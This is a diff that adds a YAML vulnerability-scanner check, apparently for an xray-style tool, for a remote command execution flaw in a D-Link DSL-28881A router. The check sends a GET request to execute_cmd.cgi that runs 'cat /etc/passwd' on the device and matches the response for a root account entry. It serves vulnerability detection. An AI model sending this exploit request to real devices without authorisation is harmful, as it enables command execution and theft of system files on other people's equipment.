@@ -1,0 +1,11 @@
+name: D-Link-DSL-28881A-RCE
+rules:
+  r0:
+    request:
+      method: GET
+      path: /cgi-bin/execute_cmd.cgi?timestamp=test&cmd=cat%20/etc/passwd
+    expression: response.status == 200 && "root:.*?:[0-9]*:[0-9]*:".bmatches(response.body)
+expression: r0()
+detail:
+  links:
+    - https://mp.weixin.qq.com/s/_BX38i-IqrpsvNx4_LyH5g
